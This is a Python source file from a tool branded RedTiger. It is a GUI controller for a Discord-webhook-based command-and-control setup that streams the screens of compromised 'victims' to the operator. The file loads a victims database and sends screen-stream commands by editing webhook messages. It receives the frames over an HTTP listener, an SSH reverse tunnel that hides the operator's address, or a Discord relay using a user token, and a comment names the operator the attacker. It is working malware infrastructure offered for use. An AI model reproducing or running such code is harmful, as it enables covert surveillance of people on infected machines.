# Copyright (c) RedTiger
# See the file 'LICENSE' for copying permission

from Config.Util import *
from Config.Config import *

try:
    import threading
    import http.server
    import json
    import os
    import sys
    import time
    import io
    import socket
    import subprocess
    import requests
    from PIL import Image, ImageTk
    import customtkinter as ctk
except Exception as e:
    ErrorModule(e)
    sys.exit(1)

Title("Remote Screen View")

# ── Frame store (thread-safe) ─────────────────────────────────────────────────
from collections import deque
_frame_lock     = threading.Lock()
_current_frame  = [None]      # PIL Image
_fps_smoothed   = [0.0]
_frame_times    = deque(maxlen=30)  # ring buffer of last 30 frame timestamps
_frames_total   = [0]
_stream_active       = [False]
_stream_start_time   = [None]
_first_frame_recvd   = [False]

# ── Channel ID helper (for Discord relay mode) ────────────────────────────────
def _get_channel_id_from_webhook(wh_url):
    try:
        r = requests.get(wh_url, timeout=8)
        if r.status_code == 200:
            return str(r.json().get('channel_id', ''))
    except:
        pass
    return ''

# ── HTTP receiver ─────────────────────────────────────────────────────────────
class _FrameHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            data   = self.rfile.read(length)
            img    = Image.open(io.BytesIO(data))
            now    = time.time()
            with _frame_lock:
                _current_frame[0] = img
                _frames_total[0] += 1
                _frame_times.append(now)
                if len(_frame_times) >= 2:
                    span = _frame_times[-1] - _frame_times[0]
                    _fps_smoothed[0] = round((len(_frame_times) - 1) / span, 1) if span > 0 else 0
            self.send_response(200)
            self.end_headers()
        except:
            self.send_response(400)
            self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'RedTiger Frame Receiver OK')

    def log_message(self, *a): pass

def _start_http_server(port):
    srv = http.server.HTTPServer(('0.0.0.0', port), _FrameHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv

# ── Network helpers ───────────────────────────────────────────────────────────
def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def _get_public_ip():
    """Fetch attacker's public IP via multiple providers."""
    for url in ('https://api.ipify.org', 'https://ifconfig.me/ip', 'https://icanhazip.com'):
        try:
            r = requests.get(url, timeout=5)
            ip = r.text.strip()
            if ip and ip.replace('.', '').isdigit():
                return ip
        except:
            continue
    return None

def _start_tunnel(port):
    """
    Open a localhost.run SSH tunnel (no install needed — uses system ssh).
    Returns (public_url, proc) or (None, None) on failure.
    localhost.run assigns a random subdomain: https://<id>.lhr.life
    """
    try:
        proc = subprocess.Popen(
            ['ssh', '-o', 'StrictHostKeyChecking=no',
             '-o', 'ServerAliveInterval=30',
             '-R', f'80:localhost:{port}',
             'nokey@localhost.run', '--', '--output=json'],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        import json as _tj
        deadline = time.time() + 15
        while time.time() < deadline:
            line = proc.stdout.readline()
            if not line:
                break
            try:
                data = _tj.loads(line.decode('utf-8', 'ignore'))
                url = data.get('address') or data.get('url', '')
                if url:
                    if not url.startswith('http'):
                        url = 'https://' + url
                    return url, proc
            except:
                pass
        # fallback: tunnel URL not found in JSON output
    except Exception:
        pass
    return None, None

def _get_wifi_signal():
    """Return (ssid, signal_pct) or (None, None) if wired/unavailable."""
    try:
        out = subprocess.check_output('netsh wlan show interfaces', shell=True, timeout=5,
                                      creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', 'ignore')
        ssid   = next((l.split(':', 1)[1].strip() for l in out.split('\n')
                        if 'SSID' in l and 'BSSID' not in l), None)
        signal = next((l.split(':', 1)[1].strip() for l in out.split('\n') if 'Signal' in l), None)
        return ssid, signal
    except:
        return None, None

def _auto_params(signal_str):
    """Return (fps, quality) tuned to the connection quality."""
    try:
        pct = int(signal_str.replace('%', '').strip())
    except:
        pct = 100   # assume wired / unknown = excellent
    if pct >= 80: return 15, 75
    if pct >= 60: return  8, 60
    if pct >= 40: return  4, 45
    return 2, 30

# ── Victims DB helpers ────────────────────────────────────────────────────────
_DB_PATH = os.path.join(tool_path, 'build', 'c2_victims.json')

def _load_db():
    try:
        with open(_DB_PATH, 'r') as f:
            return json.load(f)
    except:
        return {}

_sess = requests.Session()
_sess.headers.update({'Content-Type': 'application/json', 'User-Agent': f'{name_tool}/{version_tool}'})

def _patch_msg(wh, mid, desc):
    """Returns (ok: bool, code: int|str)."""
    for _ in range(3):
        try:
            r = _sess.patch(f"{wh}/messages/{mid}",
                            json={'embeds': [{'title': '[C2 CMD]', 'description': desc, 'color': 16711680}]},
                            timeout=6)
            if r.status_code == 429:
                time.sleep(r.json().get('retry_after', 5))
                continue
            return r.status_code in (200, 204), r.status_code
        except Exception as e:
            return False, str(e)
    return False, "max retries"

# ── GUI ───────────────────────────────────────────────────────────────────────
_RED     = '#e63946'
_DARK    = '#0d0d0d'
_PANEL   = '#111827'
_PANEL2  = '#1f2937'
_TEXT    = '#f1f5f9'
_MUTED   = '#64748b'
_GREEN   = '#22c55e'
_YELLOW  = '#f59e0b'

class RemoteViewApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        ctk.set_appearance_mode('dark')
        self.title(f'{name_tool}  —  Remote Screen View')
        self.geometry('1400x860')
        self.minsize(900, 600)
        self.configure(fg_color=_DARK)

        self._server      = None
        self._port        = 9876
        self._local_ip    = _get_local_ip()
        self._public_ip   = None
        self._tunnel_proc = None
        self._tunnel_url  = None
        self._streaming   = False
        self._victim_name = None
        self._victim_wh   = None
        self._victim_mid  = None

        self._sv_status  = ctk.StringVar(value='Idle — select a victim and press Start')
        self._sv_fps     = ctk.StringVar(value='● FPS: —')
        self._sv_frames  = ctk.StringVar(value='Frames: 0')
        self._sv_net     = ctk.StringVar(value=f'Receiver: {self._local_ip}:{self._port}')
        self._sv_wifi    = ctk.StringVar(value='Network: detecting…')
        self._sv_pubip   = ctk.StringVar(value='Public IP: detecting…')
        self._sv_tunnel  = ctk.StringVar(value='Tunnel: off')
        self._quality    = ctk.IntVar(value=65)
        self._fps_target = ctk.IntVar(value=8)
        self._use_tunnel = ctk.BooleanVar(value=False)

        self._photo_ref  = None

        # Discord relay mode
        self._discord_relay      = False
        self._discord_poll_stop  = [True]
        self._discord_channel_id = None
        self._discord_last_id    = None

        self._build_ui()
        self._start_receiver()
        self._detect_wifi()
        self._fetch_public_ip()
        self._gui_loop()

    # ── UI construction ───────────────────────────────────────────────────────
    def _build_ui(self):
        # ── Top bar ─────────────────────────────────────────────────
        top = ctk.CTkFrame(self, fg_color=_PANEL, corner_radius=0, height=52)
        top.pack(fill='x')
        top.pack_propagate(False)

        ctk.CTkLabel(top, text='  Remote Screen View',
                     font=ctk.CTkFont('Helvetica', 17, 'bold'),
                     text_color=_RED).pack(side='left', padx=6)
        ctk.CTkLabel(top, text=f'{name_tool} {version_tool}',
                     font=ctk.CTkFont('Helvetica', 12), text_color=_MUTED).pack(side='left', padx=4)

        self._lbl_fps = ctk.CTkLabel(top, textvariable=self._sv_fps,
                                      font=ctk.CTkFont('Helvetica', 14, 'bold'), text_color=_GREEN)
        self._lbl_fps.pack(side='right', padx=16)
        ctk.CTkLabel(top, textvariable=self._sv_frames,
                     font=ctk.CTkFont('Helvetica', 12), text_color=_MUTED).pack(side='right', padx=8)

        # ── Body (canvas + side panel) ──────────────────────────────
        body = ctk.CTkFrame(self, fg_color=_DARK)
        body.pack(fill='both', expand=True, padx=0, pady=0)
        body.grid_columnconfigure(0, weight=1)
        body.grid_columnconfigure(1, weight=0)
        body.grid_rowconfigure(0, weight=1)

        # Screen canvas
        self._canvas_frame = ctk.CTkFrame(body, fg_color='#080808', corner_radius=6)
        self._canvas_frame.grid(row=0, column=0, padx=8, pady=8, sticky='nsew')
        self._canvas_lbl = ctk.CTkLabel(
            self._canvas_frame, text='No signal',
            font=ctk.CTkFont('Helvetica', 28), text_color='#2a2a2a',
            fg_color='#080808', corner_radius=6
        )
        self._canvas_lbl.pack(fill='both', expand=True)

        # Side panel
        side = ctk.CTkScrollableFrame(body, fg_color=_PANEL, width=260, corner_radius=8,
                                       scrollbar_button_color=_RED,
                                       scrollbar_button_hover_color='#c0392b')
        side.grid(row=0, column=1, padx=(0, 8), pady=8, sticky='ns')

        def _sec(txt):
            ctk.CTkLabel(side, text=txt,
                         font=ctk.CTkFont('Helvetica', 12, 'bold'), text_color=_RED,
                         anchor='w').pack(fill='x', padx=10, pady=(12, 3))
            ctk.CTkFrame(side, fg_color=_RED, height=1, corner_radius=0).pack(fill='x', padx=10, pady=0)

        def _info(var, color=_MUTED):
            ctk.CTkLabel(side, textvariable=var, font=ctk.CTkFont('Helvetica', 11),
                         text_color=color, anchor='w', wraplength=220).pack(fill='x', padx=10, pady=2)

        # Victim
        _sec('Victim')
        self._db = _load_db()
        names = [self._LOCAL_TEST_LABEL] + list(self._db.keys())
        self._victim_dd = ctk.CTkOptionMenu(
            side, values=names, command=self._on_victim_select,
            fg_color=_PANEL2, button_color=_RED, button_hover_color='#c0392b',
            font=ctk.CTkFont('Helvetica', 12), dynamic_resizing=False
        )
        self._victim_dd.pack(fill='x', padx=10, pady=6)
        self._on_victim_select(names[0])

        ctk.CTkButton(side, text='↺  Refresh victims', fg_color=_PANEL2,
                      hover_color=_PANEL, text_color=_MUTED,
                      font=ctk.CTkFont('Helvetica', 11),
                      command=self._refresh_victims, height=28).pack(fill='x', padx=10, pady=(0, 4))

        # Network
        _sec('Network')
        _info(self._sv_net, _MUTED)
        _info(self._sv_wifi, _MUTED)
        _info(self._sv_pubip, _YELLOW)
        _info(self._sv_tunnel, _GREEN)

        ctk.CTkLabel(side, text='IP sent to victim (edit if needed):',
                     font=ctk.CTkFont('Helvetica', 11), text_color=_TEXT,
                     anchor='w').pack(fill='x', padx=10, pady=(6, 0))
        self._ip_entry = ctk.CTkEntry(side, placeholder_text='auto-detecting…',
                                      font=ctk.CTkFont('Helvetica', 12),
                                      fg_color=_PANEL2, border_color=_RED,
                                      text_color=_TEXT)
        self._ip_entry.pack(fill='x', padx=10, pady=(2, 4))

        self._btn_tunnel = ctk.CTkButton(
            side, text='⚡  Start Tunnel (no router needed)',
            fg_color='#064e3b', hover_color='#065f46', text_color=_GREEN,
            font=ctk.CTkFont('Helvetica', 11, 'bold'), height=32,
            command=self._toggle_tunnel
        )
        self._btn_tunnel.pack(fill='x', padx=10, pady=(0, 4))

        # Parameters
        _sec('Stream Parameters')

        ctk.CTkLabel(side, text='JPEG Quality', font=ctk.CTkFont('Helvetica', 11),
                     text_color=_TEXT, anchor='w').pack(fill='x', padx=10, pady=(6, 0))
        self._sl_q = ctk.CTkSlider(side, from_=10, to=95, variable=self._quality,
                                    number_of_steps=85, progress_color=_RED, button_color=_RED,
                                    button_hover_color='#c0392b')
        self._sl_q.pack(fill='x', padx=10, pady=2)
        self._lbl_q = ctk.CTkLabel(side, text='65%', font=ctk.CTkFont('Helvetica', 11),
                                    text_color=_MUTED, anchor='e')
        self._lbl_q.pack(fill='x', padx=10)
        self._quality.trace_add('write', lambda *_: self._lbl_q.configure(text=f'{self._quality.get()}%'))

        ctk.CTkLabel(side, text='Target FPS', font=ctk.CTkFont('Helvetica', 11),
                     text_color=_TEXT, anchor='w').pack(fill='x', padx=10, pady=(6, 0))
        self._sl_f = ctk.CTkSlider(side, from_=1, to=30, variable=self._fps_target,
                                    number_of_steps=29, progress_color=_RED, button_color=_RED,
                                    button_hover_color='#c0392b')
        self._sl_f.pack(fill='x', padx=10, pady=2)
        self._lbl_f = ctk.CTkLabel(side, text='8 fps', font=ctk.CTkFont('Helvetica', 11),
                                    text_color=_MUTED, anchor='e')
        self._lbl_f.pack(fill='x', padx=10)
        self._fps_target.trace_add('write', lambda *_: self._lbl_f.configure(text=f'{self._fps_target.get()} fps'))

        ctk.CTkButton(side, text='⚡  Auto (detect WiFi)',
                      fg_color=_PANEL2, hover_color=_PANEL, text_color=_YELLOW,
                      font=ctk.CTkFont('Helvetica', 11), height=30,
                      command=self._auto_params).pack(fill='x', padx=10, pady=(4, 8))

        # Relay Mode
        _sec('Relay Mode')
        relay_row = ctk.CTkFrame(side, fg_color='transparent')
        relay_row.pack(fill='x', padx=10, pady=(6, 2))
        self._btn_relay_http = ctk.CTkButton(
            relay_row, text='HTTP Direct', width=110, height=30,
            fg_color=_RED, hover_color='#c0392b', text_color=_TEXT,
            font=ctk.CTkFont('Helvetica', 11, 'bold'),
            command=lambda: self._set_relay_mode('http')
        )
        self._btn_relay_http.pack(side='left', padx=(0, 4))
        self._btn_relay_discord = ctk.CTkButton(
            relay_row, text='Discord', width=100, height=30,
            fg_color=_PANEL2, hover_color=_PANEL, text_color=_MUTED,
            font=ctk.CTkFont('Helvetica', 11, 'bold'),
            command=lambda: self._set_relay_mode('discord')
        )
        self._btn_relay_discord.pack(side='left')

        ctk.CTkLabel(side, text='Discord token (Discord mode only):',
                     font=ctk.CTkFont('Helvetica', 10), text_color=_MUTED,
                     anchor='w').pack(fill='x', padx=10, pady=(4, 0))
        self._relay_token_entry = ctk.CTkEntry(
            side, placeholder_text='Bot ... or user token',
            font=ctk.CTkFont('Helvetica', 11),
            fg_color=_PANEL2, border_color=_MUTED, text_color=_TEXT,
            state='disabled'
        )
        self._relay_token_entry.pack(fill='x', padx=10, pady=(2, 8))

        # Controls
        _sec('Controls')
        self._btn_start = ctk.CTkButton(
            side, text='▶  Start Stream', fg_color=_RED, hover_color='#c0392b',
            font=ctk.CTkFont('Helvetica', 13, 'bold'), height=40,
            command=self._start_stream
        )
        self._btn_start.pack(fill='x', padx=10, pady=(6, 3))

        self._btn_stop = ctk.CTkButton(
            side, text='■  Stop Stream', fg_color=_PANEL2, hover_color='#374151',
            text_color='#9ca3af', font=ctk.CTkFont('Helvetica', 13, 'bold'), height=40,
            command=self._stop_stream, state='disabled'
        )
        self._btn_stop.pack(fill='x', padx=10, pady=3)

        self._btn_save = ctk.CTkButton(
            side, text='💾  Save Frame', fg_color=_PANEL2, hover_color='#374151',
            text_color=_MUTED, font=ctk.CTkFont('Helvetica', 11), height=32,
            command=self._save_frame
        )
        self._btn_save.pack(fill='x', padx=10, pady=(3, 12))

        # Status bar
        bar = ctk.CTkFrame(self, fg_color=_PANEL2, corner_radius=0, height=26)
        bar.pack(fill='x', side='bottom')
        bar.pack_propagate(False)
        ctk.CTkLabel(bar, textvariable=self._sv_status,
                     font=ctk.CTkFont('Helvetica', 11), text_color=_MUTED,
                     anchor='w').pack(side='left', padx=8)

    _LOCAL_TEST_LABEL = '◎  Local Test  (this machine)'

    # ── Victim selection ──────────────────────────────────────────────────────
    def _refresh_victims(self):
        self._db = _load_db()
        names = [self._LOCAL_TEST_LABEL] + (list(self._db.keys()) or [])
        self._victim_dd.configure(values=names)
        self._victim_dd.set(names[0])
        self._on_victim_select(names[0])

    def _on_victim_select(self, name):
        if name == self._LOCAL_TEST_LABEL:
            self._victim_name = self._LOCAL_TEST_LABEL
            self._victim_wh   = None
            self._victim_mid  = None
            self._sv_status.set('Local Test selected — stream captures this machine directly')
            return
        self._db = _load_db()
        if name in self._db:
            self._victim_name = name
            self._victim_wh   = self._db[name]['webhook']
            self._victim_mid  = self._db[name]['msg_id']
            self._discord_channel_id = None
            self._sv_status.set(f'Selected: {name}  —  ready to stream')

    # ── Auto-parameters ───────────────────────────────────────────────────────
    def _detect_wifi(self):
        def _bg():
            ssid, sig = _get_wifi_signal()
            if ssid and sig:
                self._sv_wifi.set(f'WiFi: {ssid}  {sig}')
            else:
                self._sv_wifi.set('Connection: Ethernet / unknown')
        threading.Thread(target=_bg, daemon=True).start()

    def _fetch_public_ip(self):
        def _bg():
            ip = _get_public_ip()
            if ip:
                self._public_ip = ip
                def _ui(addr=ip):
                    self._sv_pubip.set(f'Public IP: {addr}')
                    if not self._tunnel_url:
                        self._ip_entry.delete(0, 'end')
                        self._ip_entry.insert(0, addr)
                self.after(0, _ui)
            else:
                local = self._local_ip
                def _ui_fail(loc=local):
                    self._sv_pubip.set('Public IP: failed — use Tunnel or enter manually')
                    if not self._tunnel_url:
                        self._ip_entry.delete(0, 'end')
                        self._ip_entry.insert(0, loc)
                self.after(0, _ui_fail)
        threading.Thread(target=_bg, daemon=True).start()

    def _toggle_tunnel(self):
        if self._tunnel_proc:
            self._stop_tunnel()
        else:
            self._sv_tunnel.set('Tunnel: connecting…')
            self._btn_tunnel.configure(state='disabled', text='⏳  Connecting…')
            def _bg():
                url, proc = _start_tunnel(self._port)
                if url and proc:
                    self._tunnel_proc = proc
                    self._tunnel_url  = url
                    host = url.replace('https://', '').replace('http://', '').rstrip('/')
                    def _ui_tunnel_ok(h=host, u=url):
                        self._sv_tunnel.set(f'Tunnel: {u}')
                        self._ip_entry.delete(0, 'end')
                        self._ip_entry.insert(0, h)
                        self._sv_status.set(f'Tunnel active: {u}')
                        self._btn_tunnel.configure(state='normal', text='✕  Stop Tunnel',
                                                   fg_color='#7f1d1d', hover_color='#991b1b',
                                                   text_color='#fca5a5')
                    self.after(0, _ui_tunnel_ok)
                else:
                    def _ui_tunnel_fail():
                        self._sv_tunnel.set('Tunnel: failed — check ssh is installed')
                        self._sv_status.set('Tunnel failed. Make sure OpenSSH is installed.')
                        self._btn_tunnel.configure(state='normal',
                                                   text='⚡  Start Tunnel (no router needed)')
                    self.after(0, _ui_tunnel_fail)
            threading.Thread(target=_bg, daemon=True).start()

    def _stop_tunnel(self):
        if self._tunnel_proc:
            try: self._tunnel_proc.terminate()
            except: pass
            self._tunnel_proc = None
            self._tunnel_url  = None
        self._sv_tunnel.set('Tunnel: off')
        self._btn_tunnel.configure(state='normal', text='⚡  Start Tunnel (no router needed)',
                                   fg_color='#064e3b', hover_color='#065f46',
                                   text_color=_GREEN)

    def _auto_params(self):
        def _bg():
            ssid, sig = _get_wifi_signal()
            fps, quality = _auto_params(sig)
            label = f'{ssid or "Wired"} {sig or ""}  →  {fps} fps / {quality}%'
            def _ui(f=fps, q=quality, l=label):
                self._fps_target.set(f)
                self._quality.set(q)
                self._sv_wifi.set(f'Auto: {l}')
                self._sv_status.set(f'Parameters set automatically: {l}')
            self.after(0, _ui)
        threading.Thread(target=_bg, daemon=True).start()

    # ── Server ────────────────────────────────────────────────────────────────
    def _start_receiver(self):
        for port in range(self._port, self._port + 10):
            try:
                self._server = _start_http_server(port)
                self._port = port
                self._sv_net.set(f'Local receiver: 0.0.0.0:{self._port}')
                self._sv_status.set(f'Receiver listening on port {self._port} — detecting public IP…')
                return
            except OSError:
                continue
        self._sv_status.set('ERROR: could not bind HTTP receiver port')

    # ── Relay mode toggle ─────────────────────────────────────────────────────
    def _set_relay_mode(self, mode):
        self._discord_relay = (mode == 'discord')
        if self._discord_relay:
            self._btn_relay_http.configure(fg_color=_PANEL2, hover_color=_PANEL, text_color=_MUTED)
            self._btn_relay_discord.configure(fg_color=_RED, hover_color='#c0392b', text_color=_TEXT)
            self._relay_token_entry.configure(state='normal', border_color=_RED)
        else:
            self._btn_relay_http.configure(fg_color=_RED, hover_color='#c0392b', text_color=_TEXT)
            self._btn_relay_discord.configure(fg_color=_PANEL2, hover_color=_PANEL, text_color=_MUTED)
            self._relay_token_entry.configure(state='disabled', border_color=_MUTED)

    # ── Stream control ────────────────────────────────────────────────────────
    def _start_stream(self):
        # ── Local test mode — capture this machine directly ───────────────────
        if self._victim_name == self._LOCAL_TEST_LABEL:
            fps  = self._fps_target.get()
            qual = self._quality.get()
            self._streaming = True
            _stream_active[0]     = True
            _stream_start_time[0] = time.time()
            _first_frame_recvd[0] = False
            self._discord_poll_stop[0] = True  # no Discord polling
            self._btn_start.configure(state='disabled')
            self._btn_stop.configure(state='normal')
            self._canvas_lbl.configure(text='Awaiting signal…', text_color='#555555')
            self._sv_status.set(f'Local capture — {fps} fps / {qual}%')
            self._sv_fps.set('● FPS: —')
            self._lbl_fps.configure(text_color=_MUTED)
            threading.Thread(
                target=self._local_capture_loop,
                args=(fps, qual),
                daemon=True
            ).start()
            return

        if not self._victim_mid or not self._victim_wh:
            self._sv_status.set('No victim selected.')
            return

        fps  = self._fps_target.get()
        qual = self._quality.get()

        if self._discord_relay:
            token = self._relay_token_entry.get().strip()
            if not token:
                self._sv_status.set('Discord Relay: enter your token in the Relay Mode section first.')
                return
            fps_dc = min(fps, 2)   # Discord webhook rate limit caps useful fps at ~2
            cmd    = f'CMD::screenstream::discord::{fps_dc}::{qual}'
            self._sv_status.set(f'Sending Discord relay command to {self._victim_name}…')

            def _send_discord():
                # Resolve channel_id
                ch_id = self._discord_channel_id
                if not ch_id:
                    ch_id = _get_channel_id_from_webhook(self._victim_wh)
                    self._discord_channel_id = ch_id
                if not ch_id:
                    self.after(0, lambda: self._sv_status.set('Could not get channel ID from webhook.'))
                    return

                # Snapshot latest message ID so we ignore old messages
                headers = {'Authorization': token}
                try:
                    r = requests.get(
                        f'https://discord.com/api/v9/channels/{ch_id}/messages?limit=1',
                        headers=headers, timeout=6
                    )
                    if r.status_code == 200 and r.json():
                        self._discord_last_id = r.json()[0].get('id')
                    else:
                        self._discord_last_id = None
                except:
                    self._discord_last_id = None

                ok, code = _patch_msg(self._victim_wh, self._victim_mid, cmd)
                if ok:
                    self._streaming = True
                    _stream_active[0]      = True
                    _stream_start_time[0]  = time.time()
                    _first_frame_recvd[0]  = False
                    self._discord_poll_stop[0] = False
                    poll_args = (ch_id, token, self._discord_poll_stop)
                    def _ui_ok_discord():
                        self._btn_start.configure(state='disabled')
                        self._btn_stop.configure(state='normal')
                        self._canvas_lbl.configure(text='Awaiting signal…', text_color='#555555')
                        self._sv_status.set(
                            f'Discord relay active — awaiting frames from {self._victim_name}…')
                        self._sv_fps.set('● FPS: —')
                        self._lbl_fps.configure(text_color=_MUTED)
                        threading.Thread(
                            target=self._poll_discord,
                            args=poll_args,
                            daemon=True
                        ).start()
                    self.after(0, _ui_ok_discord)
                else:
                    self.after(0, lambda c=code: self._sv_status.set(
                        f'PATCH failed (HTTP {c}) — victim offline or wrong MSG_ID.'))

            threading.Thread(target=_send_discord, daemon=True).start()

        else:
            # HTTP direct mode
            if self._tunnel_url:
                host      = self._tunnel_url.replace('https://', '').replace('http://', '').rstrip('/')
                send_port = 443
                cmd = f'CMD::screenstream::{host}::{send_port}::{fps}::{qual}'
                self._sv_status.set(f'Sending via tunnel to {self._victim_name}… ({host})')
            else:
                send_ip = self._ip_entry.get().strip() or self._local_ip
                cmd = f'CMD::screenstream::{send_ip}::{self._port}::{fps}::{qual}'
                self._sv_status.set(
                    f'Sending command to {self._victim_name}… ({send_ip}:{self._port})')

            def _send():
                ok, code = _patch_msg(self._victim_wh, self._victim_mid, cmd)
                if ok:
                    self._streaming = True
                    _stream_active[0]     = True
                    _stream_start_time[0] = time.time()
                    _first_frame_recvd[0] = False
                    def _ui_ok():
                        self._btn_start.configure(state='disabled')
                        self._btn_stop.configure(state='normal')
                        self._canvas_lbl.configure(text='Awaiting signal…', text_color='#555555')
                        self._sv_status.set(
                            f'Command sent to {self._victim_name} — awaiting first frame…')
                        self._sv_fps.set('● FPS: —')
                        self._lbl_fps.configure(text_color=_MUTED)
                    self.after(0, _ui_ok)
                else:
                    self.after(0, lambda c=code: self._sv_status.set(
                        f'PATCH failed (HTTP {c}) — wrong MSG_ID or offline.'))
            threading.Thread(target=_send, daemon=True).start()

    def _stop_stream(self):
        def _send():
            if self._victim_wh and self._victim_mid:
                _patch_msg(self._victim_wh, self._victim_mid, 'CMD::screenstream::stop')
        threading.Thread(target=_send, daemon=True).start()

        self._streaming = False
        _stream_active[0]          = False
        _stream_start_time[0]      = None
        _first_frame_recvd[0]      = False
        self._discord_poll_stop[0] = True
        self._discord_last_id      = None
        with _frame_lock:
            _current_frame[0] = None
            _fps_smoothed[0]  = 0.0
            _frame_times.clear()
            _frames_total[0]  = 0
        self._btn_start.configure(state='normal')
        self._btn_stop.configure(state='disabled')
        self._canvas_lbl.configure(image=None, text='No signal', text_color='#2a2a2a')
        self._photo_ref = None
        self._sv_status.set('Stream stopped.')
        self._sv_fps.set('● FPS: —')
        self._sv_frames.set('Frames: 0')
        self._lbl_fps.configure(text_color=_MUTED)

    # ── Local screen capture loop ─────────────────────────────────────────────
    def _local_capture_loop(self, fps, qual):
        from PIL import ImageGrab
        interval = 1.0 / max(1, fps)
        while _stream_active[0]:
            try:
                t0  = time.time()
                img = ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=qual, optimize=True)
                buf.seek(0)
                img2 = Image.open(buf)
                now  = time.time()
                with _frame_lock:
                    _current_frame[0] = img2
                    _frames_total[0] += 1
                    _frame_times.append(now)
                    if len(_frame_times) >= 2:
                        span = _frame_times[-1] - _frame_times[0]
                        _fps_smoothed[0] = round(
                            (len(_frame_times) - 1) / span, 1
                        ) if span > 0 else 0
                sl = max(0, interval - (time.time() - t0))
                if sl > 0:
                    time.sleep(sl)
            except Exception:
                time.sleep(0.5)

    # ── Discord relay polling thread ──────────────────────────────────────────
    def _poll_discord(self, channel_id, token, stop_flag):
        headers  = {'Authorization': token}
        last_id  = self._discord_last_id
        while not stop_flag[0]:
            try:
                url = f'https://discord.com/api/v9/channels/{channel_id}/messages?limit=10'
                if last_id:
                    url += f'&after={last_id}'
                r = requests.get(url, headers=headers, timeout=8)
                if r.status_code == 200:
                    msgs = r.json()
                    for msg in reversed(msgs):   # oldest first
                        mid = msg.get('id', '')
                        if mid and (last_id is None or int(mid) > int(last_id)):
                            last_id = mid
                        for att in msg.get('attachments', []):
                            fname = att.get('filename', '').lower()
                            if not fname.endswith(('.jpg', '.jpeg', '.png')):
                                continue
                            att_url = att.get('url', '')
                            if not att_url:
                                continue
                            try:
                                ir = requests.get(att_url, timeout=10)
                                if ir.status_code == 200:
                                    img = Image.open(io.BytesIO(ir.content))
                                    now = time.time()
                                    with _frame_lock:
                                        _current_frame[0] = img
                                        _frames_total[0] += 1
                                        _frame_times.append(now)
                                        if len(_frame_times) >= 2:
                                            span = _frame_times[-1] - _frame_times[0]
                                            _fps_smoothed[0] = round(
                                                (len(_frame_times) - 1) / span, 1
                                            ) if span > 0 else 0
                            except:
                                pass
                elif r.status_code == 429:
                    wait = r.json().get('retry_after', 2)
                    time.sleep(wait)
                    continue
            except:
                pass
            time.sleep(0.8)

    # ── Save frame ────────────────────────────────────────────────────────────
    def _save_frame(self):
        with _frame_lock:
            img = _current_frame[0]
        if img is None:
            self._sv_status.set('No frame to save.')
            return
        out_dir = os.path.join(tool_path, 'build', 'RemoteView')
        os.makedirs(out_dir, exist_ok=True)
        ts   = time.strftime('%Y%m%d_%H%M%S')
        name = f'frame_{self._victim_name or "unknown"}_{ts}.png'
        path = os.path.join(out_dir, name)
        img.save(path)
        self._sv_status.set(f'Frame saved → {path}')

    # ── GUI refresh loop ──────────────────────────────────────────────────────
    def _gui_loop(self):
        with _frame_lock:
            img = _current_frame[0]
            fps = _fps_smoothed[0]
            tot = _frames_total[0]

        if img is not None:
            # First frame ever received for this session
            if self._streaming and not _first_frame_recvd[0]:
                _first_frame_recvd[0] = True
                fps_t = self._fps_target.get()
                qual  = self._quality.get()
                self._sv_status.set(f'Streaming from {self._victim_name}  —  {fps_t} fps / {qual}%')

            cw = self._canvas_frame.winfo_width()
            ch = self._canvas_frame.winfo_height()
            if cw > 10 and ch > 10:
                iw, ih = img.size
                scale = min(cw / iw, ch / ih)
                nw    = max(1, int(iw * scale))
                nh    = max(1, int(ih * scale))
                resized = img.resize((nw, nh), Image.Resampling.BILINEAR)
                photo   = ImageTk.PhotoImage(resized)
                self._canvas_lbl.configure(image=photo, text='')
                self._photo_ref = photo

            self._sv_fps.set(f'● FPS: {fps}')
            self._sv_frames.set(f'Frames: {tot}')
            if fps >= 8:
                self._lbl_fps.configure(text_color=_GREEN)
            elif fps >= 3:
                self._lbl_fps.configure(text_color=_YELLOW)
            else:
                self._lbl_fps.configure(text_color=_RED)

        elif self._streaming and not _first_frame_recvd[0]:
            # No frame yet — show timeout warning after 15s
            t0 = _stream_start_time[0]
            if t0 and (time.time() - t0) > 15:
                elapsed = int(time.time() - t0)
                self._sv_status.set(
                    f'No frames received ({elapsed}s) — check IP/port, firewall, or use Tunnel'
                )
                self._canvas_lbl.configure(
                    text=f'No signal  ({elapsed}s)\nCheck IP / port / firewall\nor enable Tunnel',
                    text_color='#7f1d1d'
                )

        interval = max(30, int(1000 / max(1, self._fps_target.get())))
        self.after(interval, self._gui_loop)

    def on_close(self):
        self._stop_stream()
        self._stop_tunnel()
        try:
            if self._server:
                self._server.shutdown()
        except:
            pass
        self.destroy()


# ── Banner + entry point ──────────────────────────────────────────────────────
Slow(f"""
{red}  ██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
{red}  ██╔══██╗██║   ██║██║██╔════╝██║    ██║  {white}Remote Screen View
{red}  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║  {white}Real-time · View-only · Auto-adapt
{red}  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║  {red}{name_tool} {version_tool}
{red}  ██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
{red}  ╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝{white}
""")

app = RemoteViewApp()
app.protocol('WM_DELETE_WINDOW', app.on_close)
app.mainloop()

Continue()
